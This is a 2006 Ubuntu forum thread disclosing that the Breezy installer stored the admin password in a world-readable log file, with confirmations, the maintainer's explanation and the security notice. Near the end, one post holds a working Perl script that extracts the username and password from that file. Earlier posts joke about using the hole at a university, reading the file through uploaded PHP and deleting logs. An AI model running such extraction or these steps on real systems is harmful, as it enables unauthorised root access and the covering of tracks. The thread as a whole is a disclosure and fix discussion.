---
title: "Possible to get the administrator password ?"
date: 2006-03-12
forum: Server Platforms
---

### Post by Teotihuacan on 2006-03-12
Hello,
 
I have noticed something "funny" :
 
There is a file that contains all the installation logs : 
/var/log/installer/cdebconf/questions.dat 
In this file, there is all the questions asked to the user abd all the user's answers. 

So, near the end of the file, we can find the user created during the installation... and its password (not hidden).
 
Then, tell me if I'm wrong :
_ in the normal installation mode, the user created can get the root privileges with sudo
_ in the expert mode, there is a root account created
 
In both case, it's possible to get an administrator username/password. 
 
Moreover, this file can be read by all users (contrary to the syslog). 
 
Personally, the user I have created during the installation is the computer administrator and I had no reason (until now) to change its password after the installation. I've just created a non-administrator user after the installation. 

I have researched on this forum about this file and I have found no result. On google, there isn't many results. There is just a link to the Ubuntu Wiki (but for the installation for a cluster)
 
I think it's risky to store an user's password in a file readable by everybody. (for example if we can login via ssh on an Ubuntu server)

I don't know what you think of this...

Bye.

---

### Post by knalle on 2006-03-12
OMG, your right, shit!

---

### Post by Lord Illidan on 2006-03-12
In Dapper, I looked at the file, and while I could see my username, I couldn't see any password.

---

### Post by kittycatsexycat on 2006-03-12
thats a bit freaky....

Cant say i've noticed that....

lol....:twisted:

---

### Post by knalle on 2006-03-12
this is a MAJOR security issue i think, i did a grep on my **/var** for my password and stopped after just these;

/var/log/installer/cdebconf/questions.dat:Value: mypasswd
/var/log/installer/cdebconf/questions.dat:Value: mypasswd
/var/log/debian-installer/cdebconf/questions.dat:Value: mypasswd
/var/log/debian-installer/cdebconf/questions.dat:Value: mypasswd

these files are not supposed to have the password in cleartext, and if so they should be promptly removed by the installer after they have been used

thanx for this tip! Is it registered as a bug in Breezy? i mean breezy been out for a while

---

### Post by knalle on 2006-03-12
even freaking worse! the file is readable from ANY registred account, get a ubuntu breezy account and you can be root too!

karl@dundra:/media/share/games/hoi2$ less /var/log/installer/cdebconf/questions.dat

shows the root password in the terminal in clear text 

:-k :-k

---

### Post by astoltz on 2006-03-12
Just checked my qustions.dat file and the username/password is NOT there.

---

### Post by knalle on 2006-03-12
[QUOTE=astoltz]Just checked my qustions.dat file and the username/password is NOT there.[/QUOTE]

good for you, i've posted this as a bug in breezy to launhpad because i've just have done a basic Breezy 5.10 install and the password shouldn't be there after install

---

### Post by public_void on 2006-03-12
OMG. That is one huge security threat. Well done in finding it.

---

### Post by astoltz on 2006-03-12
Dude, I just thought I'd add some extra info.  I've also got a default Breezy install and the password is not in the above mentioned files.  I'm not saying it's not a bug and that's it's not serious, just that it's not quite as simple as the password gets written to the /var/log/installer/cdebconf/questions.dat file every time.

---

### Post by uselpa on 2006-03-12
I found the password on Kubuntu as well. I think it is a serious issue as the file is world-readable.

---

### Post by knalle on 2006-03-12
yeah, i think its serious; [https://launchpad.net/distros/ubuntu/+bug/34606](https://launchpad.net/distros/ubuntu/+bug/34606)

---

### Post by knalle on 2006-03-12
[QUOTE=astoltz]Dude, I just thought I'd add some extra info.  I've also got a default Breezy install and the password is not in the above mentioned files.  I'm not saying it's not a bug and that's it's not serious, just that it's not quite as simple as the password gets written to the /var/log/installer/cdebconf/questions.dat file every time.[/QUOTE]

true i got 3 ubuntu breezy installations on three different computers, i found the password in the /var only for one of them,

but all have been installed from the same Breezy 5.10 cd and i have run basis install on all three

---

### Post by knalle on 2006-03-12
[QUOTE=astoltz]Dude, I just thought I'd add some extra info.  I've also got a default Breezy install and the password is not in the above mentioned files.  I'm not saying it's not a bug and that's it's not serious, just that it's not quite as simple as the password gets written to the /var/log/installer/cdebconf/questions.dat file every time.[/QUOTE]

i did a grep in /var and found my password in several files, have you done a grep?

---

### Post by astoltz on 2006-03-12
I stand corrected!  Don't know why I missed it the first time through grep but I just double checked and indeed I have my password in clear text in the file /var/log/installer/cdebconf/questions.dat.  File is world readable.

Time to chage passwords.

---

### Post by Klaidas on 2006-03-12
OMG :o 
It's true. I found my pass there. This MUST be reported. 
Good thing I changed my pass after install

---

### Post by engla on 2006-03-12
Great find. We should have kept this secret, and the bug too though. Now that it is known, I'm hoping for a patch **tomorrow**, latest.

I can confirm this issue on my install, a new breezy install on ppc
all the directories /var log installer cdebconf are all chmod 755 owned root:root
The file is chmod 644 owned root:root

Yes, I rmed the file as soon as I confirmed this...

---

### Post by OffHand on 2006-03-12
I found my password also in /var/log/installer/cdebconf/questions.dat
I hope this will get fixed fast.

---

### Post by knalle on 2006-03-12
In the meantime you can gain root access on any computer that is affected either by rlogin/telnet/ftp or ssh access, as long as your permitted a login.

Oslo university is running Ubuntu Breezy 5.10 on all their computers, hehe i might try this on monday :-D

if you can upload a php/perl file to the server you can read the password out of var/logs with fopen(), muhahahaha

---

### Post by Lord Illidan on 2006-03-12
Perhaps it is fixed in dapper. Will check for it at school on Breezy.

---

### Post by localzuk on 2006-03-12
Be careful - I'm pretty sure most uni's will kick you out if they find this out. I know mine would. Also, the access on Ubuntu is likely logged so they will be able to track it...

---

### Post by knalle on 2006-03-12
[QUOTE=localzuk]Be careful - I'm pretty sure most uni's will kick you out if they find this out. I know mine would. Also, the access on Ubuntu is likely logged so they will be able to track it...[/QUOTE]

im root, ill just kill the logs, but im just kidding, i don't know how to hack if it was my life ;)

---

### Post by knalle on 2006-03-12
[QUOTE=engla]Great find. We should have kept this secret, and the bug too though. Now that it is known, I'm hoping for a patch **tomorrow**, latest.
[/QUOTE]

can everybody that has confirmed this do it in the bugentry i posted? this way the developer can see its confirmed by more than two

---

### Post by knalle on 2006-03-12
[https://launchpad.net/distros/ubuntu/+bug/34606](https://launchpad.net/distros/ubuntu/+bug/34606)

confirmed and moved too critcal, thanx to the OP this is major!

---

### Post by Klaidas on 2006-03-12
Show this to you teacher maybe you'll get a good mark for that ;) 
Now seariously: I hope this gets fixed soon. This is MAJOR :(

---

### Post by knalle on 2006-03-12
[QUOTE=Klaidas]Show this to you teacher maybe you'll get a good mark for that ;) 
Now seariously: I hope this gets fixed soon. This is MAJOR :([/QUOTE]

i'm not at school anymore, i was thinking about telling it to the kids at the free library service the poor university is running,,  muhahahahahahahah (and even more evil laugh)

---

### Post by Klaidas on 2006-03-12
Is this bug-security hole already reported?

---

### Post by knalle on 2006-03-12
no, i have just posted a bug report; [https://launchpad.net/distros/ubuntu/+bug/34606](https://launchpad.net/distros/ubuntu/+bug/34606)

---

### Post by MrDan on 2006-03-12
is there any reason for not just rm (deleting) the whole questions.dat file??:-k :-k :-k

---

### Post by MrDan on 2006-03-12
Oh and incidently, I find that in dapper on my machine password shows "None"

---

### Post by knalle on 2006-03-12
[QUOTE=MrDan]is there any reason for not just rm (deleting) the whole questions.dat file??:-k :-k :-k[/QUOTE]
just delete it, its safest, and dapper is not affected by this, only breezy

---

### Post by Silent1 on 2006-03-12
could read that file as a regular user and i saw my sudo password for the account read the file with.

---

### Post by gookie on 2006-03-12
i'll let beagle sniff my whole dapper starting from "/" and see if it finds my password in plain text. hehe.

---

### Post by Klaidas on 2006-03-12
Clear the history of terminal commands after that ;)

---

### Post by gookie on 2006-03-12
[QUOTE=Klaidas]Clear the history of terminal commands after that ;)[/QUOTE]

beagle is not run in root. so it should only index world-viewable files.

---

### Post by sleepkreep on 2006-03-12
I just looked at the file and did not see my password.  Why would this happen on some installs, but not others?

---

### Post by Changeling on 2006-03-12
My password is also there. Time to change it anyway.

---

### Post by Zelut on 2006-03-12
Yeah, mine is listed too.  What is the suggested short-term fix for this?  Can the file be deleted?

---

### Post by SirNuke on 2006-03-12
[QUOTE=gookie]beagle is not run in root. so it should only index world-viewable files.[/QUOTE]

Yes, but the file is world viewable.  The permissions on it is 644.

---

### Post by WebScud on 2006-03-12
[quote=engla]Great find. We should have kept this secret, and the bug too though. Now that it is known, I'm hoping for a patch **tomorrow**, latest.

I can confirm this issue on my install, a new breezy install on ppc
all the directories /var log installer cdebconf are all chmod 755 owned root:root
The file is chmod 644 owned root:root

Yes, I rmed the file as soon as I confirmed this...[/quote]

And now that it's been on the [frontpage of Digg]("http://www.digg.com/linux_unix/Administrator_root_password_readable_in_cleartext_on_Ubuntu_Breezy")...

---

### Post by JoWilly on 2006-03-12
Jeezzz... this has already shown up on osnews....

[http://osnews.com/story.php?news_id=13951]("http://osnews.com/story.php?news_id=13951")

---

### Post by ssam on 2006-03-12
[QUOTE=kuyaedz]Yeah, mine is listed too.  What is the suggested short-term fix for this?  Can the file be deleted?[/QUOTE]

just change your password.

it only has the password enter during install.

---

### Post by public_void on 2006-03-12
TBH I'm amazed at how fast everyone knows. I suppose it is good, so that users know these a security hole, but bad as everyone knows and can exploit it. Hopefully this is fixed fast and isn't like Windows where you wait a couple of days or weeks for a fix.

EDIT: OMG, the [amount of people looking at this thread](http://img74.imageshack.us/img74/9577/users0qn.jpg)

---

### Post by jamesford on 2006-03-12
am i right in thinking that this is only a problem if someone has access to your computer, either physically or via telnet etc and that a basic one-user desktop computer like mine should be fine?

i guess it would be a huge problem if breezy was used as a mutliuser eggdrop sever for example ?

---

### Post by Zelut on 2006-03-12
On a single user machine that doesn't accept remote connections you are *probably* safe, but this is still definitely a bad idea to have your password lying around..

Pending a fix I have chmod'd the file to 600 so it is no longer readable.  Not sure if deleting the file would cause problems for whatever reason.

---

### Post by Bil-E-daKid on 2006-03-12
Just checked both Ubuntu boxes I have (one at work and one at home).

The home one didn't have the password in clear text but the work one did.

Go figure.  I've removed the questions.dat file from my work box - perhaps I should have used 'shred' instead?

---

### Post by jamesford on 2006-03-12
well i deleted my file and rebooted and it didnt seem to have any side effects

---

### Post by JoWilly on 2006-03-12
[QUOTE=Bil-E-daKid]
Go figure.  I've removed the questions.dat file from my work box - perhaps I should have used 'shred' instead?[/QUOTE]

I think that when we are talking root access there is never enough paranoia....

---

### Post by gookie on 2006-03-12
[QUOTE=SirNuke]Yes, but the file is world viewable.  The permissions on it is 644.[/QUOTE]

I was referring to the history log of the Terminal inputs as one guy noted, obviously they're not world viewable.

---

### Post by kaamos on 2006-03-12
Confirmed here as well. Password in plaintext. This thread should be made sticky.

---

### Post by gookie on 2006-03-12
It made the front page of [DIGG](http://www.digg.com/linux_unix/Administrator_root_password_readable_in_cleartext_on_Ubuntu_Breezy) in no time...

[http://www.digg.com/linux_unix/Administrator_root_password_readable_in_cleartext_on_Ubuntu_Breezy](http://www.digg.com/linux_unix/Administrator_root_password_readable_in_cleartext_on_Ubuntu_Breezy)

---

### Post by LordHunter317 on 2006-03-12
[QUOTE=engla]Great find. We should have kept this secret, and the bug too though.[/quote]:rolleyes: What possible good does hiding this problem do?

---

### Post by matthurne on 2006-03-12
I installed breezy from cd - a couple of weeks ago dist-upgraded to dapper.  Checked the file in question on my machine, and like everyone else, the password was there.

---

### Post by thelusiv on 2006-03-12
[QUOTE=LordHunter317]:rolleyes: What possible good does hiding this problem do?[/QUOTE]
Keeping security problems unannounced until there is a fix is generally considered good practice, because it limits the amount of time that it can be exploited.

Anybody know the status of the pending fix? When will it be available through security updates?

---

### Post by nemik on 2006-03-12
it's a very easy fix; just delete those files and change your password if you feel it's been compromised.

but yea this should be put into an update ASAP for everyone. I can understand it in Dapper since its still in 'flight'/beta. but that fact that its on breezy...oh man this is not gonna look good. certainly will give MS some fuel for their fire.

---

### Post by JoWilly on 2006-03-12
Colin Waston has uploaded the security fix to the Breezy and Dapper repos :-D

This is something, we are Sunday evening and its fixed within a few hours.

How long does it usualy take M$ ?

---

### Post by Teotihuacan on 2006-03-12
[QUOTE=MrDan]is there any reason for not just rm (deleting) the whole questions.dat file??:-k :-k :-k[/QUOTE]

I won't delete these file on my computer. I'll wait for the fix, just to see when there will be a fix. I have breezy on my laptop and there is no ssh server or anything like that.

I think the best thing we have to do now is to send an email to the people that we know that run Ubuntu (especially the servers administrators).

That's really a silly bug and that a pity for a good Linux distribution as Ubuntu. It's a distribution I really like.

---

### Post by Sutekh on 2006-03-12
[QUOTE=thelusiv]Keeping security problems unannounced until there is a fix is generally considered good practice, because it limits the amount of time that it can be exploited.[/QUOTE]
Certainly can't agree with that.  If there is a security flaw then people should know about it, so they can take their own measures.  Hiding it from the people who use the distribution goes against my definition of open source.  

Plus look how quick it was addressed and fixed.

---

### Post by Odice on 2006-03-12
Just delete the file, and all ok.
Change password if u want too.

---

### Post by computerdave on 2006-03-12
I checked mine and sure enough it was there in all it's readability.  I just opened a shell --> passwd
then changed it to something else, problem solved (sort of).:-k
I'll delete the file later once I'm sure I don't still need it.  Do I still need it?:???:

---

### Post by cjwatson on 2006-03-12
So, er, yeah. This one sucked. As others have said, security updates are now making their way ASAP to both Breezy and Dapper (the latter for Breezy installs upgraded to Dapper). Here's the comment I just posted to OSNews about this:

I'm the Ubuntu installer maintainer, so obviously this bug is ultimately my fault. I'm sorry for that - it's clear it shouldn't have sneaked past QA. (We'll be updating our testing processes to be rather more careful about this sort of thing.) Now that I've spent the evening doing security updates to clean up the mess, I thought I might take a moment to explain how this happened, and why it wasn't noticed as an issue in Breezy at the same time as it was fixed in Dapper.

The Ubuntu installer (like Debian) uses a framework called debconf to do all its user interaction; that framework has a backend database which stores all the answers, which is where passwords ended up being stored for this vulnerability. Naturally, when you're asking for passwords using debconf, you take a lot of care to clean them out of the database afterwards: we explicitly clear them out in the password-asking code pretty much as soon as we can, and we have a separate database for the answers to password questions which isn't copied to the directory of installer log files in the final installed system. This had all been working well for some time (e.g. in Hoary).

Unfortunately, the way we arranged for the password question to be asked in the first stage of the Breezy installer meant that two debconf databases were involved rather than one, and the passwords only got cleared out of one of those databases. Even this would have been OK if it weren't for the fact that some changes we needed to make in cdebconf for other reasons in Breezy (I've yet to track down the exact changesets involved, but never mind) broke the mechanism that was supposed to make sure that passwords ended up in a separate database. Sigh.

As for why we didn't notice the problem in Breezy when this was fixed in Dapper, well, that's because the fix in Dapper was part of a massive installer reorganisation ([http://riva.ucam.org/~cjwatson/blog/ubuntu/2006-01-03-single-stage-installer.html](http://riva.ucam.org/~cjwatson/blog/ubuntu/2006-01-03-single-stage-installer.html)) and it was really just fixed by accident. So it goes.

Anyhow, I've fixed this just about as soon as was humanly possible for me, and take it extremely seriously. While perhaps for some of you it's too little too late, we'll do everything we can to install better defences against this kind of thing in future.

---

### Post by towsonu2003 on 2006-03-12
just posted to the bug report as well: I got no _updates_ that fixed this. I did upgrades one minute ago, and still had to delete it manually. 

damn... thinking that all the ssh "runners" are still screwed... brrrr(ezy). well, at least we'll be famous for being the first most popular and easiest hackable (at the same time) linux distro around :mrgreen: 

by the way, one of the comments in that bug says *dapper* is vulnerable too. 

one last thing: make this a sticky... this is damn important...

---

### Post by say on 2006-03-12
[QUOTE=knalle]Oslo university is running Ubuntu Breezy 5.10 on all their computers, hehe i might try this on monday :-D[/quote]

That's not true. UiO doesn't run Breezy anywhere. In fact, they run RHEL on their desktops and a variety of different OSs on the servers.

---

### Post by JoWilly on 2006-03-12
> **towsonu2003]just posted to the bug report as well: I got no _updates_ that fixed this. I did upgrades one minute ago, and still had to delete it manually.[/QUOTE]

Colin has uploaded the fix, it takes usualy about 1 hour to propagate to the repos said:**
> 
damn... thinking that all the ssh "runners" are still screwed... brrrr(ezy). well, at least we'll be famous for being the first most popular and easiest hackable (at the same time) linux distro around :mrgreen: 

by the way, one of the comments in that bug says *dapper* is vulnerable too. 

one last thing: make this a sticky... this is damn important...

As they say.... "shit happens"...

Read again. Dapper is not vulnerable itself, only if upgraded from breezy, which is vulnerable.

I am very impressed by the speed this was fixed on a Sunday evening. Thanks a lot Colin for beeing so professional.

---

### Post by earobinson on 2006-03-12
I think we have a new bug number 1

---

### Post by markt9 on 2006-03-12
===========================================================
Ubuntu Security Notice USN-262-1	     March 12, 2006
Ubuntu 5.10 installer vulnerability
[https://launchpad.net/bugs/34606](https://launchpad.net/bugs/34606)
===========================================================

A security issue affects the following Ubuntu releases:

Ubuntu 5.10 (Breezy Badger)

The following packages are affected:

base-config
passwd

The problem can be corrected by upgrading the affected package to
version 2.67ubuntu20 (base-config) and 1:4.0.3-37ubuntu8 (passwd).  In
general, a standard system upgrade is sufficient to effect the
necessary changes.

Details follow:

Karl Øie discovered that the Ubuntu 5.10 installer failed to clean
passwords in the installer log files. Since these files were
world-readable, any local user could see the password of the first
user account, which has full sudo privileges by default.

The updated packages remove the passwords and additionally make the
log files readable only by root.

This does not affect the Ubuntu 4.10, 5.04, or the upcoming 6.04
installer.  However, if you upgraded from Ubuntu 5.10 to the current
development version of Ubuntu 6.04 ('Dapper Drake'), please ensure
that you upgrade the passwd package to version 1:4.0.13-7ubuntu2 to
fix the installer log files.

---

### Post by jimmygoon on 2006-03-12
To my understanding... this is understood but... Dapper Flight 5 (for me at least) does not suffer from this "bug"

---

### Post by kaamos on 2006-03-12
Updated, upgraded, problem solved. That was fast (thank god).

---

### Post by TrendyDark on 2006-03-12
I just checked out this file in my install and yes, it is there. No, I'm not worried about Breezy security, and thanks for letting us know about this. 

Is it safe to just delete this file from any future Breezy installations? I plan on installing Breezy on several machines later this month and I don't need everyone to know they aren't safe.

---

### Post by gaz00 on 2006-03-12
Colin - thanks for the fast work!

---

### Post by lungdart on 2006-03-12
Saw this on digg and almost took a heart attack. Before going to the forums I checked the file and found my password was there in plain text, at which point i chmoded the file to 600.

Read this thread, did a sudo apt-get update and the system update icon apeared in my task bar. i then did a system update through the gui (my prefered method) and checked the file. password was gone and set to 600, along with the same file in /var/log/debian-installer/cdebconf/ folder.

A few hours and there was a system update top null the security flaw. the fastest I've seen windows go is 2 weeks untill the next tuesday for scheudualed updates. Just goes to show you how much more secure open source can be.

---

### Post by r4ik on 2006-03-12
For those who want to change there passwrd,

[https://wiki.ubuntu.com/LostPassword?highlight=%28password%29](https://wiki.ubuntu.com/LostPassword?highlight=%28password%29)

If i am incorrect or there is an better alternative please jump on it.

---

### Post by imagine on 2006-03-12
Umm, you can just change your password with passwd. Rebooting into single user mode is just necessary when you *forgot* your password.



Btw good work Watson.
If just every security flaw was fixed this fast.

---

### Post by khermans on 2006-03-12
```
#!/usr/bin/perl -w

use warnings;
use strict;

##############################################################################
# Author: Kristian Hermansen
# Date: 3/12/2006
# Overview: Ubuntu Breezy stores the installation password in plain text
# Link: https://launchpad.net/distros/ubuntu/+source/shadow/+bug/34606
##############################################################################

print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "Kristian Hermansen's 'Eazy Breezy' Password Recovery Tool\n";
print "99% effective, thank your local admin ;-)\n";
print "FOR EDUCATIONAL PURPOSES ONLY!!!\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n";

# the two vulnerable files
my $file1 = "/var/log/installer/cdebconf/questions.dat";
my $file2 = "/var/log/debian-installer/cdebconf/questions.dat";

print "Checking if an exploitable file exists...";
if ( (-e $file1) || (-e $file2) )
{ 
  print "Yes\nNow checking if readable...";
  if ( -r $file1 )
  {
    getinfo($file1);
  }
  else
  {
    if ( -r $file2 ) {
      getinfo($file2);
    }
    else {
      print "No\nAdmin may have changed the permissions on the files :-(\nExiting...\n";
      exit -2;
    }
  }
}
else
{
  print "No\nFile may have been deleted by the administrator :-(\nExiting...\n";
  exit -1;
}

sub getinfo {
  my $fn = shift;
  print "Yes\nHere come the details...\n\n";
  my $realname = `grep -A 1 "Template: passwd/user-fullname" $fn | grep "Value: " | sed 's/Value: //'`;
  my $user = `grep -A 1 "Template: passwd/username" $fn | grep "Value: " | sed 's/Value: //'`;
  my $pass = `grep -A 1 "Template: passwd/user-password-again" $fn | grep "Value: " | sed 's/Value: //'`;
  chomp $realname;
  chomp $user;
  chomp $pass;
  print "Real Name: $realname\n";
  print "Username: $user\n";
  print "Password: $pass\n";
}
```

---

### Post by r4ik on 2006-03-12
[QUOTE=imagine]Umm, you can just change your password with passwd. Rebooting into single user mode is just necessary when you *forgot* your password.



Btw good work Watson.
If just every security flaw was fixed this fast.[/QUOTE]

Oke that's better.
Thanks.

---

### Post by John.Michael.Kane on 2006-03-12
@khermans Why have you posted what looks to be code to exploit this problem.. please remove it. if someone here wants  that code then let them PM you for it..

Thank you..

---

### Post by cjwatson on 2006-03-12
Yes, it's safe to delete it; that file is useful for me and others to diagnose installer bugs, but somehow I suspect I'll be rather careful about asking for it from Breezy users in future anyway!

Alternatively, I advise upgrading from breezy-security after installation and before creating any local users anyway, which will protect you from this bug.

---

### Post by mrkite on 2006-03-12
Why does this file even exist?  What's the point in keeping all of this info anyway?

---

### Post by MrDez on 2006-03-12
I checked it and it was there and the file was world readable.  I then ran Adept updater (to simulate a run of the mill non techie) and now the .dat file is root readable only.  Looks fixed to me, run your update tool of choice.

---

### Post by aysiu on 2006-03-12
Five months to discover, eleven hours to fix. Interesting.

---

### Post by cjwatson on 2006-03-12
(Weekends being what they are, it took about 7.5 of those hours before I actually heard about it ...)

---

### Post by Owdy on 2006-03-12
Only username here.

---

### Post by astoltz on 2006-03-12
[QUOTE=mrkite]Why does this file even exist?  What's the point in keeping all of this info anyway?[/QUOTE]
It shouldn't.  Take a look at the post by cjwatson a few back in this thread - there's a good description of what happened.

---

### Post by mrkite on 2006-03-12
[QUOTE=astoltz]It shouldn't.  Take a look at the post by cjwatson a few back in this thread - there's a good description of what happened.[/QUOTE]

I understand that the password stuff was left in by accident (or bug, or whatever)..  but I don't understand why it logs the install questions/answers in the first place.

---

### Post by Xyborg on 2006-03-12
mmmm :-k 

[https://wiki.ubuntu.com/UbuntuOnCluster](https://wiki.ubuntu.com/UbuntuOnCluster)

> 
# Step 4: Installing other things and remove the installer log which contains a cleartext password
aptitude -y install linux-686-smp manpages-dev
rm /var/log/installer/debconf-seed
rm /var/log/installer/cdebconf/questions.dat


\\:D/

---

### Post by K.Mandla on 2006-03-13
Wow. This has definitely been the most interesting thread I've read in a while. 

A big salute to the OPer for showing it to the world. And an even bigger salute to the folks who fixed it in what seems like record time. I'm impressed. That kind of turnaround just doesn't happen with Windows.

(Just for the record, I couldn't see mine after a fresh install of Dapper Flight 5.)

---

### Post by berlinbrown on 2006-03-13
Hmm, this is scary.  And, I looked in 5.10 and my password was there, exposed.

Lucky, I am not an admin.

---

### Post by vayu on 2006-03-13
This is what I posted on digg:

It is a serious bug. It is serious for those that their machines have exposure to the outside world and/or other users that are not trustworthy. In other words single desktop users should not be concerned. In all cases the fix is really easy. Change your password. It is only keeping the original install user password. Those with security needs who know what they're doing will have changed their passwords regularly and would not have been affected by this at all. 

Other points to note: This only affects those who started with a fresh install of Breezy. Machines upgraded to Breezy from prior releases (and even beta versions of Breezy) are not affected. Dapper (which is not a release product anyway) is not affected unless it was upgraded from a machine that had a fresh install of Breezy to start with.

Another point to note is that this problem was solved and a patch issued within hours of it's discovery. For all machines except those where the default upgrade option has been disabled, the patch will be presented the very next time the machine boots up.

The Ubuntu/Kubuntu team has been doing an outstanding job, has won much recognition throughout the computing community and has become one of the premier Linux distributions. I believe their immediate resolution of this problem reflects on the quality and commitment of that team. if you don't crash and crash hard then you're not out there doing it.

In a time when I'm sure there will be many who are critical I would like to say thank you to the Ubuntu team for a truly amazing gift.

---

### Post by N8K99 on 2006-03-13
this thread got tagged up on del.icio.us popular page - over 23,000 viewings of this thread at this point. Awesome work on the fix - great job all around guys!

---

### Post by Sparken on 2006-03-13
Yep, I just did an install of Kubuntu breezy 5.1 using the "server" setting and since
it does no installation of Xwindows, it ends up being an "ubuntu" install. 

This file: 
/var/log/installer/cdebconf/questions.dat 
does indeed contain the user with sudo privs that is created during the
install and a few lines down, it shows the password in plain text. 
Any normal user can enter that directory and view the file. 

Good find and luckily I have a good friend that sent me a link here :)

---

### Post by nmsa on 2006-03-13
same on my side, got all servers exposed.
I removed the file and I'm safe. ;) 
Greetings and well done finding this.

---

### Post by tqft on 2006-03-13
What is best root kit finder for Breezy?

Given that the problem has been out and about for months?

The truly paranoid will backup data and reinstall from known good, the rest of us would just like to know if any nast's are there?

What is in the ubuntu repositories to help us?

Thanks.

Ian

---

### Post by dcstar on 2006-03-13
[QUOTE=Owdy]Only username here.[/QUOTE]
Me too.

BTW, my Breezy install was an upgrade from Hoary, so the questions.dat file still had the pre-Breezy date stamp from the original Hoary install.

---

### Post by g-a-c on 2006-03-13
I'm pretty sure that chkrootkit is in the universe/multiverse repositories. I don't know of any other rootkit checking tools unfortunately :(

---

### Post by madsen on 2006-03-13
Weird...
I installed Breezy (pretty default install) on my dad's computer and /var/log/installer doesn't even exist and /var/log/debian-installer is a broken link to /var/log/installer... I guess that box is safe.

---

### Post by stateq2 on 2006-03-13
damn

---

### Post by Spug on 2006-03-13
[QUOTE=madsen]Weird...
I installed Breezy (pretty default install) on my dad's computer and /var/log/installer doesn't even exist and /var/log/debian-installer is a broken link to /var/log/installer... I guess that box is safe.[/QUOTE]
Same here, on my October-old clean install... Wonder why. Not that I'm going to complain, though, but strange that this isn't consistent. I only had time to check for the file (which didn't exist) and do an aptitude update before I went to school, else I would've grepped for my password to see if it's stored anywhere else. I'll do it anyway when I come home, though, and suggest you do the same.

---

### Post by Klaidas on 2006-03-13
Looks like it's fixed. Reboot and update :)

---

### Post by Klaidas on 2006-03-13
Ok, I have updated, the line seems to be deleted. Thanks for fast update :)
Thios must be the most interesting bug I have ever seen
Keep up the good work :)

---

### Post by greatshape on 2006-03-13
[QUOTE=dcstar]Me too.

BTW, my Breezy install was an upgrade from Hoary, so the questions.dat file still had the pre-Breezy date stamp from the original Hoary install.[/QUOTE]

Yes, same here on my local machine (kubuntu, upgraded from hoary), no passwords exposed, only username. 
But still, pretty mean bug :-) 
I go check some servers, just to be sure ;) 

Steve

---

### Post by ice60 on 2006-03-13
[QUOTE=Teotihuacan]Hello,
 
I have noticed something "funny" :
 
There is a file that contains all the installation logs : 
/var/log/installer/cdebconf/questions.dat 
In this file, there is all the questions asked to the user abd all the user's answers. 

So, near the end of the file, we can find the user created during the installation... and its password (not hidden).
 
Then, tell me if I'm wrong :
_ in the normal installation mode, the user created can get the root privileges with sudo
_ in the expert mode, there is a root account created
 
In both case, it's possible to get an administrator username/password. 
 
Moreover, this file can be read by all users (contrary to the syslog). 
 
Personally, the user I have created during the installation is the computer administrator and I had no reason (until now) to change its password after the installation. I've just created a non-administrator user after the installation. 

I have researched on this forum about this file and I have found no result. On google, there isn't many results. There is just a link to the Ubuntu Wiki (but for the installation for a cluster)
 
I think it's risky to store an user's password in a file readable by everybody. (for example if we can login via ssh on an Ubuntu server)

I don't know what you think of this...

Bye.[/QUOTE]
ha, nice one, Teotihuacan. hopefully this will shutup all the Linux fanboy idiots who say how secure Linux is when they know nothing about it.

---

### Post by nlogax on 2006-03-13
[QUOTE=towsonu2003]damn... thinking that all the ssh "runners" are still screwed... brrrr(ezy). well, at least we'll be famous for being the first most popular and easiest hackable (at the same time) linux distro around [/QUOTE]

If you expose SSH to the Internet without requiring private keys for access, 
you're crazy.

---

### Post by Ferio on 2006-03-13
It hit [http://www.barrapunto.com]("http://www.barrapunto.com") (the Spanish-spoken SlashDot), but they're aware of the fix yet and people seem quite happy with it being solved so fast (I am, indeed).

By the way, it doesn't seem to affect the Spanish distros based on Breezy (MoLinux, LinEx, GuadaLinEx). Just in case you know anybody using them.

---

### Post by int on 2006-03-13
I have upgrade Breezy to Darpper Flight4 and now Flight 5, and the bug is also present..



[The bug in Portuguese]("http://www.max-pt.net/modules/news/article.php?storyid=882")

---

### Post by Brunellus on 2006-03-13
[QUOTE=int]I have upgrade Breezy to Darpper Flight4 and now Flight 5, and the bug is also present..



[The bug in Portuguese]("http://www.max-pt.net/modules/news/article.php?storyid=882")[/QUOTE]
username is readable; password is not--does that mean that I'm fixed?

---

### Post by int on 2006-03-13
I see my password in this two files..

```
/var/log/installer/cdebconf/questions.dat
/var/log/debian-installer/cdebconf/questions.dat
```

you can see if you have this bug 

```
grep -r _sudopassword_ /var/log/installer/cdebconf/questions.dat
grep -r _sudopassword_ /var/log/debian-installer/cdebconf/questions.dat
```

you have to change _sudopassword_ to your "sudo password".

---

### Post by missmoondog on 2006-03-13
whoa!! 
i see it twice actually, kind of.

uncool!!
heading for update now.

---

### Post by Lord Illidan on 2006-03-13
I checked on Breezy Computer at school. Btw, it is actually my computer. Since I refused to use anything rather than Linux for my project, I got permission to repartition a machine with Breezy.

And, yep, there was the password.

We also hit slashdot : [http://it.slashdot.org/article.pl?sid=06/03/13/0525254&from=rss](http://it.slashdot.org/article.pl?sid=06/03/13/0525254&from=rss)

---

### Post by Ghetto_Smurf on 2006-03-13
now i really can't wait for dapper!

i hope the future xubuntu iso is based on dapper.

---

### Post by LordHunter317 on 2006-03-13
[QUOTE=SD-Plissken]@khermans Why have you posted what looks to be code to exploit this problem.. please remove it. if someone here wants  that code then let them PM you for it..[/quote]**No.**  Even suggesting someone shouldn't fully disclose ***is absolutely totally reprehensible and shameful.***

It's totally inappropriate behavior.  You can't put the cat back in the bag once it got out.  

[quote=nlogax]
If you expose SSH to the Internet without requiring private keys for access,
you're crazy.[/quote]Not if for example, you can't trust the people shelling into your box to mantain good security practices.  There's no way to enforce policy over SSH keypairs.   I can do it against passwords.

---

### Post by LordHunter317 on 2006-03-13
[QUOTE=thelusiv]Keeping security problems unannounced until there is a fix is generally considered good practice, because it limits the amount of time that it can be exploited.[/quote]By some portion of the community, yes, but not universally.

And only for certain classes of exploits.  This issue is not the sort of thing that would be undisclosed in any case; an attacker can trivally find the mistake on his/her own.

At anyrate, once it's disclosed by anyone, there's no point in pretending that it doesn't exist.  And that's what happened, so...

---

### Post by 146lily on 2006-03-13
Is it possible that on a clean breezy install that does not display the password the machines have been hacked and the password removed? The inconsistency needs an explanation. All installs of a specific type should be affect?

I'm a Ubuntu newbie ...the way this issue was dealt with gives me more confidence in you all, not less. Well done!

---

### Post by Kurt` on 2006-03-13
On my installation of Kubuntu Breezy, my password is not visible in that file, but I removed it anyways.

